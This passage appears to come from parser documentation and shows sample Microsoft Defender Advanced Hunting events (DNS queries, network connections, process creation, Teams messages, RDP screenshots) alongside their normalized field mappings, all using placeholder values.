srv-files\",\"FROM.DEVICE\":\"example.com\",\"TO.DEVICE\":\"SRV-DC1\",\"ACTOR.DEVICE\":\"\"},\"ReportId\":\"33333333-3333-3333-3333-333333333333\",\"Timestamp\":\"2024-10-01T08:32:08.211673Z\",\"Application\":\"Active Directory\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "iam"
            ],
            "dataset": "identity_query_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-01T08:32:08.211673Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Active Directory",
                "DestinationDeviceName": "srv-dc1.example.com",
                "QueryTarget": "1.cnr.io",
                "QueryType": "Text",
                "SourceComputerId": "computer domain office srv-files"
            },
            "type": "DNS query"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "port": 53
        },
        "host": {
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "33333333-3333-3333-3333-333333333333"
                }
            }
        },
        "network": {
            "protocol": "Dns"
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        }
    }
    	
	```


=== "test_inbound_connection_attempt.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-08-08T06:10:51.1543444Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"_TimeReceivedBySvc\":\"2024-08-08T06:09:04.2831271Z\",\"properties\":{\"DeviceName\":\"example.com\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"ReportId\":7053,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":46112,\"LocalIP\":\"2.2.2.2\",\"LocalPort\":443,\"Protocol\":\"TcpV4\",\"RemoteUrl\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessId\":0,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"InitiatingProcessAccountSid\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessTokenElevation\":\"None\",\"AppGuardContainerId\":\"\",\"LocalIPType\":null,\"RemoteIPType\":null,\"ActionType\":\"InboundConnectionAttempt\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AdditionalFields\":\"{\\\"Source Mac\\\":\\\"02:00:00:00:00:01\\\",\\\"Destination Mac\\\":\\\"02:00:00:00:00:02\\\",\\\"Tcp Flags\\\":2,\\\"Packet Size\\\":60}\",\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-08-08T06:07:08.3444146Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-08-08T06:07:08.344414Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "InboundConnectionAttempt"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "mac": "02:00:00:00:00:01",
            "port": 443
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "7053"
                }
            }
        },
        "network": {
            "protocol": "TcpV4"
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 0
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "mac": "02:00:00:00:00:02",
            "port": 46112
        }
    }
    	
	```


=== "test_local_ip.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"-\",\"LocalPort\":null,\"RemoteIP\":\"-\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_message_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-10-24T09:44:46.9278379Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-MessageEvents\",\"_TimeReceivedBySvc\":\"2025-10-24T09:43:16.2740000Z\",\"properties\":{\"Timestamp\":\"2025-10-24T09:43:16.274Z\",\"LastEditedTime\":\"2025-10-24T09:43:16.274Z\",\"TeamsMessageId\":\"/chats/mythreadid/messages/1111111111111\",\"SenderEmailAddress\":\"john.doe@example.com\",\"SenderDisplayName\":\"ANONYMIZED\",\"SenderObjectId\":\"11111111-1111-1111-1111-111111111111\",\"SenderType\":\"User\",\"RecipientDetails\":[{\"RecipientSmtpAddress\":\"jane.doe@example.org\",\"RecipientDisplayName\":\"DOE, Jane\",\"RecipientObjectId\":\"11111111-1111-1111-1111-111111111111\",\"RecipientType\":\"User\"}],\"IsOwnedThread\":true,\"MessageId\":\"1111111111111\",\"ParentMessageId\":\"1111111111111\",\"GroupId\":null,\"GroupName\":null,\"ThreadId\":\"mythreadid\",\"ThreadName\":null,\"ThreadType\":\"chat\",\"ThreadSubType\":\"None\",\"IsExternalThread\":false,\"MessageType\":\"RichText\",\"MessageSubtype\":\"Html\",\"MessageVersion\":\"1111111111111\",\"Subject\":null,\"ThreatTypes\":null,\"DetectionMethods\":null,\"ConfidenceLevel\":null,\"DeliveryAction\":\"Delivered\",\"DeliveryLocation\":\"Teams\",\"ReportId\":\"11111111-1111-1111-1111-111111111111\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "action": "Delivered",
            "dataset": "message_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-24T09:43:16.274000Z",
        "action": {
            "name": "Publish",
            "properties": {
                "DeliveryAction": "Delivered",
                "DeliveryLocation": "Teams",
                "IsExternalThread": false,
                "IsOwnedThread": true,
                "MessageId": "1111111111111",
                "ParentMessageId": "1111111111111",
                "RecipientDetails": [
                    {
                        "RecipientDisplayName": "DOE, Jane",
                        "RecipientObjectId": "11111111-1111-1111-1111-111111111111",
                        "RecipientSmtpAddress": "jane.doe@example.org",
                        "RecipientType": "User"
                    }
                ],
                "SenderDisplayName": "ANONYMIZED",
                "SenderEmailAddress": "john.doe@example.com",
                "SenderObjectId": "11111111-1111-1111-1111-111111111111",
                "SenderType": "User",
                "TeamsMessageId": "/chats/mythreadid/messages/1111111111111",
                "ThreadId": "mythreadid"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111"
                }
            }
        }
    }
    	
	```


=== "test_message_post_delivery.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-10-24T09:44:46.9278379Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-MessagePostDeliveryEvents\",\"_TimeReceivedBySvc\":\"2025-10-24T09:43:16.2740000Z\",\"properties\":{\"Timestamp\":\"2025-10-24T09:43:16.274Z\",\"TeamsMessageId\":\"/chats/mythreadid/messages/1111111111111\",\"Action\":\"Blocked\",\"ActionType\":\"Manual remediation\",\"ActionTrigger\":\"SpecialAction\",\"ActionResult\":\"Success\",\"SenderEmailAddress\":\"john.doe@example.com\",\"RecipientDetails\":[{\"RecipientSmtpAddress\":\"jane.doe@example.org\",\"RecipientDisplayName\":\"DOE, Jane\",\"RecipientObjectId\":\"11111111-1111-1111-1111-111111111111\",\"RecipientType\":\"User\"}],\"ThreadTypes\":\"malware\",\"ConfidenceLevel\":null,\"DetectionMethods\":null,\"LatestDeliveryLocation\":\"Teams\",\"ReportId\":\"11111111-1111-1111-1111-111111111111\",\"IsExternalThread\":false},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "action": "Blocked",
            "dataset": "message_post_delivery_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-24T09:43:16.274000Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ActionResult": "Success",
                "ActionTrigger": "SpecialAction",
                "IsExternalThread": false,
                "LatestDeliveryLocation": "Teams",
                "RecipientDetails": [
                    {
                        "RecipientDisplayName": "DOE, Jane",
                        "RecipientObjectId": "11111111-1111-1111-1111-111111111111",
                        "RecipientSmtpAddress": "jane.doe@example.org",
                        "RecipientType": "User"
                    }
                ],
                "SenderEmailAddress": "john.doe@example.com"
            },
            "type": "Manual remediation"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111"
                }
            }
        }
    }
    	
	```


=== "test_message_url_info.json"

    ```json
	
    {
        "message": "{\"time\": \"2025-10-24T09:44:09.4614384Z\", \"tenantId\": \"11111111-1111-1111-1111-111111111111\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-MessageUrlInfo\", \"_TimeReceivedBySvc\": \"2025-10-24T09:42:22.6810000Z\", \"properties\": {\"Timestamp\": \"2025-10-24T09:42:22.681Z\", \"TeamsMessageId\": \"/chats/mythreadid/messages/1111111111111\", \"Url\": \"https://www.example.com/\", \"UrlDomain\": \"www.example.com\", \"ReportId\": \"11111111-1111-1111-1111-111111111111_0000000000000000000\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "dataset": "message_url_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-24T09:42:22.681000Z",
        "action": {
            "name": "Publish",
            "properties": {
                "TeamsMessageId": "/chats/mythreadid/messages/1111111111111"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111_0000000000000000000"
                }
            }
        },
        "related": {
            "hosts": [
                "www.example.com"
            ]
        },
        "url": {
            "domain": "www.example.com",
            "full": "https://www.example.com/",
            "original": "https://www.example.com/",
            "path": "/",
            "port": 443,
            "registered_domain": "example.com",
            "scheme": "https",
            "subdomain": "www",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_process_error.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-09-24T14:19:47.7143361Z\",\"tenantId\":\"16ffffff-0000-3333-8888-addddddddd\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceProcessEvents\",\"_TimeReceivedBySvc\":\"2024-09-24T14:18:24.0670725Z\",\"properties\":{\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessFileSize\":11864,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"platform-python3.6\",\"InitiatingProcessParentFileName\":\"platform-python3.6\",\"InitiatingProcessFolderPath\":\"/usr/test/platform-python3.6\",\"InitiatingProcessCommandLine\":\"/usr/test/platform-python /usr/lib/python3.6/run.py --register\",\"SHA1\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FileSize\":193333,\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FolderPath\":\"/usr/bin/grep\",\"ProcessCommandLine\":\"grep -F smtpd_tls_protocols\\\\commandtest\",\"FileName\":\"grep\",\"ProcessId\":408996,\"InitiatingProcessId\":408996,\"ProcessCreationTime\":\"2024-09-24T14:18:11.864114Z\",\"DeviceName\":\"example.com\",\"DeviceId\":\"123412341234123412341234\",\"InitiatingProcessCreationTime\":\"2024-09-24T14:18:11.85Z\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":null,\"InitiatingProcessSignatureStatus\":\"Unknown\",\"InitiatingProcessSignerType\":\"Unknown\",\"InitiatingProcessParentId\":408229,\"ReportId\":49226,\"InitiatingProcessParentCreationTime\":\"2024-09-24T14:17:34.79Z\",\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"AccountDomain\":\"example.com\",\"AccountName\":\"user1\",\"ProcessTokenElevation\":\"None\",\"ProcessIntegrityLevel\":null,\"AccountSid\":null,\"AppGuardContainerId\":null,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessLogonId\":0,\"LogonId\":0,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AccountUpn\":null,\"AccountObjectId\":null,\"AdditionalFields\":\"{\\\"InitiatingProcessPosixEffectiveUser\\\":{\\\"Name\\\":\\\"testname\\\",\\\"DomainName\\\":\\\"testDomain\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}},\\\"InitiatingProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0},\\\"InitiatingProcessPosixProcessGroupId\\\":408125,\\\"InitiatingProcessPosixSessionId\\\":0,\\\"InitiatingProcessPosixFilePermissions\\\":[\\\"OthersExecute\\\",\\\"OthersRead\\\",\\\"GroupExecute\\\",\\\"GroupRead\\\",\\\"UserExecute\\\",\\\"UserWrite\\\",\\\"UserRead\\\",\\\"UserAll\\\"],\\\"InitiatingProcessPosixUserOwner\\\":{\\\"Name\\\":\\\"testname\\\",\\\"DomainName\\\":\\\"TestDomain\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}},\\\"InitiatingProcessPosixGroupOwner\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0},\\\"InitiatingProcessPosixRealUser\\\":{\\\"Name\\\":\\\"testname\\\",\\\"DomainName\\\":\\\"TestDomain\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}},\\\"ProcessPosixEffectiveUser\\\":{\\\"Name\\\":\\\"testname\\\",\\\"DomainName\\\":\\\"TestDomain\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}},\\\"ProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0},\\\"ProcessPosixProcessGroupId\\\":408125,\\\"ProcessPosixSessionId\\\":408125,\\\"ProcessCurrentWorkingDirectory\\\":\\\"/testname\\\",\\\"ProcessPosixFilePermissions\\\":[\\\"OthersExecute\\\",\\\"OthersRead\\\",\\\"GroupExecute\\\",\\\"GroupRead\\\",\\\"UserExecute\\\",\\\"UserWrite\\\",\\\"UserRead\\\",\\\"UserAll\\\"],\\\"ProcessPosixFileUserOwner\\\":{\\\"Name\\\":\\\"testname\\\",\\\"DomainName\\\":\\\"TestDomain\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}},\\\"ProcessPosixFileGroupOwner\\\":{\\\"Name\\\":\\\"testname\\\",\\\"PosixGroupId\\\":0}}\",\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"ProcessVersionInfoCompanyName\":null,\"ProcessVersionInfoProductName\":null,\"ProcessVersionInfoProductVersion\":null,\"ProcessVersionInfoInternalFileName\":null,\"ProcessVersionInfoOriginalFileName\":null,\"ProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"CreatedProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"ActionType\":\"ProcessCreated\",\"Timestamp\":\"2024-09-24T14:18:11.864114Z\",\"MachineGroup\":\"test Group\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_process_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-09-24T14:18:11.864114Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "/usr/test/platform-python /usr/lib/python3.6/run.py --register",
                "InitiatingProcessFileSize": 11864,
                "InitiatingProcessLogonId": "0",
                "InitiatingProcessParentFileName": "platform-python3.6",
                "IsInitiatingProcessRemoteSession": "false",
                "LogonId": "0"
            },
            "type": "ProcessCreated"
        },
        "agent": {
            "id": "123412341234123412341234"
        },
        "file": {
            "directory": "/usr/bin/grep",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "68b329da9893e34099c7d8ad5cb9c940",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "grep",
            "size": 193333
        },
        "host": {
            "id": "123412341234123412341234",
            "name": "example.com",
            "os": {
                "type": "linux"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "49226"
                }
            }
        },
        "process": {
            "args": [
                "-F",
                "smtpd_tls_protocols\\commandtest"
            ],
            "command_line": "grep -F smtpd_tls_protocols\\commandtest",
            "executable": "/usr/bin/grep",
            "name": "grep",
            "parent": {
                "args": [
                    "--register",
                    "/usr/lib/python3.6/run.py"
                ],
                "code_signature": {
                    "status": "Unknown",
                    "subject_name": "Unknown"
                },
                "command_line": "/usr/test/platform-python /usr/lib/python3.6/run.py --register",
                "executable": "/usr/test/platform-python3.6",
                "hash": {
                    "md5": "68b329da9893e34099c7d8ad5cb9c940",
                    "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                    "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
                },
                "name": "platform-python3.6",
                "pid": 408996,
                "start": "2024-09-24T14:18:11.850000Z",
                "user": {
                    "domain": "example.com",
                    "name": "user1"
                },
                "working_directory": "/usr/test"
            },
            "pid": 408996,
            "start": "2024-09-24T14:18:11.864114Z",
            "working_directory": "/usr/bin"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "user1"
        }
    }
    	
	```


=== "test_rdp_screenshot.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-07-11T08:56:07.6459371Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2025-07-11T08:55:46.0035231Z\",\"properties\":{\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"DeviceName\":\"example.com\",\"ReportId\":545956,\"InitiatingProcessId\":11948,\"InitiatingProcessCreationTime\":\"2025-07-11T08:52:42.1499232Z\",\"InitiatingProcessCommandLine\":\"\\\"mmc.exe\\\" C:\\\\Windows\\\\system32\\\\dnsmgmt.msc\",\"InitiatingProcessParentFileName\":\"svchost.exe\",\"InitiatingProcessParentId\":8568,\"InitiatingProcessParentCreationTime\":\"2025-07-10T08:08:33.9948453Z\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"mmc.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\windows\\\\system32\\\\mmc.exe\",\"InitiatingProcessAccountName\":\"j.doe\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":null,\"InitiatingProcessAccountSid\":\"user1\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"ScreenshotTaken\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":183710153,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"j.doe@acme-internal.net\",\"InitiatingProcessAccountObjectId\":null,\"FileSize\":null,\"InitiatingProcessFileSize\":1929216,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft\\u00ae Windows\\u00ae Operating System\",\"InitiatingProcessVersionInfoProductVersion\":\"10.0.20348.3804\",\"InitiatingProcessVersionInfoInternalFileName\":\"mmc.exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"mmc.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft Management Console\",\"InitiatingProcessSessionId\":\"11111111-1111-1111-1111-111111111111\",\"IsInitiatingProcessRemoteSession\":true,\"InitiatingProcessRemoteSessionDeviceName\":\"example.com\",\"InitiatingProcessRemoteSessionIP\":\"1.1.1.1\",\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"InitiatingProcessUniqueId\":\"9007199254748871\",\"Timestamp\":\"2025-07-11T08:54:06.8522256Z\",\"MachineGroup\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-07-11T08:54:06.852225Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "\"mmc.exe\" C:\\Windows\\system32\\dnsmgmt.msc",
                "InitiatingProcessFileSize": 1929216,
                "InitiatingProcessLogonId": "183710153",
                "InitiatingProcessSessionId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft Management Console",
                "InitiatingProcessVersionInfoInternalFileName": "mmc.exe",
